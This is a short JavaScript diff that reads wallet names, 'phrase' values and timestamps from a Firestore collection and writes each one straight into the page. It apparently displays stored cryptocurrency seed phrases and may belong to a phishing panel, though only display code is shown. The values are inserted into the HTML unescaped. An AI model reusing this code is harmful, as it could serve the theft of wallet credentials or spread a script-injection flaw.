@@ -30,8 +30,15 @@ db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
    
    let wallet = doc.data().wallet
    let phrase = doc.data().phrase
+   let time = doc.data().time.toDate()
    
-
+   $('body').append(`
+   <div>
+    wallet: ${wallet} <br>
+    phrase: ${phrase} <br>
+    time: ${time}
+   </div><br><br>
+   `)
    
    
    });
